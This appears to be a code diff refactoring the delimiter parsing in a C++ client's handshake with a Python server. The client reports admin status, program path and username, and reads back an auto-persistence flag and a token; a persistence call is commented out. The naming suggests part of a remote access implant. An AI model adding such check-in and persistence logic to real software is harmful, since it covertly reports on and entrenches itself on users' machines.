@@ -29,26 +29,26 @@ void HandShake::setSock(int sock)
 }
 int HandShake::startHandShake()
 {
-    // ' | ' for split data in python server.py script
+    // ' SPLIT ' for split data in python server.py script
     string is_admin;
     
     cout << "\n\nSOCKET STARTHAND: " << a_sock << endl;
     if(a_is_admin)
     {
         //If admin
-        is_admin = "MOD_HANDSHAKE_IS_ADMIN | True";
+        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "True";
         cout << "is admin in startHandShake: " << is_admin << endl;
     }
     else
     {
         //if not admin
-        is_admin = "MOD_HANDSHAKE_IS_ADMIN | False";
+        is_admin = "MOD_HANDSHAKE_IS_ADMIN" SPLIT "False";
         cout << "is admin in startHandShake: " << is_admin << endl;
     }
     //cout << a_location_prog << endl;
     //cout << a_name_user << endl;
-    string path_prog = "MOD_HANDSHAKE_PATH_PROG | "+ a_location_prog;
-    string name_user = "MOD_HANDSHAKE_NAME_USER  | "+ a_name_user;
+    string path_prog = "MOD_HANDSHAKE_PATH_PROG" SPLIT + a_location_prog;
+    string name_user = "MOD_HANDSHAKE_NAME_USER"  SPLIT + a_name_user;
 
     sendUltraSafe(a_sock, is_admin);
     sendUltraSafe(a_sock, path_prog);
@@ -79,7 +79,7 @@ int HandShake::startHandShake()
 
         string result = recvUltraSafe(a_sock);
         
-        index =  result.find("|");
+        index =  result.find(SPLIT);
         cout << "INDEX: " << index << endl;
         cout << "RESULT: " << result << endl;
         
@@ -87,24 +87,24 @@ int HandShake::startHandShake()
         {
             cout <<"--->"<< result << endl;
             cout << "LEN -->" << result.length() << endl;
-            cout << result.substr(index+2, result.length()) << endl;
-            cout << result.substr(0, index-1)  << "<-----" <<endl;
+            cout << result.substr((index+strlen(SPLIT)), result.length()) << endl;
+            cout << result.substr(0, index)  << "<-----" <<endl;
             cout << "INDEX FIND: " << index << endl;
             
-            if(result.substr(0,index-1) == "MOD_HANDSHAKE_AUTO_PERSISTENCE")
+            if(result.substr(0,index) == "MOD_HANDSHAKE_AUTO_PERSISTENCE")
             {
                 //All informations in MOD_HANDSHAKE_AUTO_PERSISTENCE
                 cout << "MOD_HANDSHAKE_AUTO_PERSISTENCE ok" << endl;
-                if(result.substr(index+2,result.length())== "True")
+                if(result.substr((index+strlen(SPLIT)),result.length())== "True")
                 {
                 cout << "IS: " << result.substr(33,result.length()) << endl;
                 //auto_persistence = true;
                 // Persistence(true,path_prog).defaultPersi();
                 }
                 
-                else if (result.substr(index+2,result.length())== "False")
+                else if (result.substr((index+strlen(SPLIT)),result.length())== "False")
                 {
-                    cout << "IS: " << result.substr(index+2,result.length()) << endl;
+                    cout << "IS: " << result.substr((index+strlen(SPLIT)),result.length()) << endl;
                     //auto_persistence = false;
                 }
                 else
@@ -112,9 +112,9 @@ int HandShake::startHandShake()
                     cout << "Error  in recv MOD_HANDSHAKE_AUTO_PERSISTENCE" << endl;
                 }
             }    
-            else if((result.substr(0, index-1)) == "MOD_HANDSHAKE_TOKEN") 
+            else if((result.substr(0, index)) == "MOD_HANDSHAKE_TOKEN") 
             {    
-                    a_token = result.substr(index+2, result.length());
+                    a_token = result.substr((index+strlen(SPLIT)), result.length());
                     cout <<"FINAL TOKEN: " << a_token << endl;
             } 
             result.erase();        
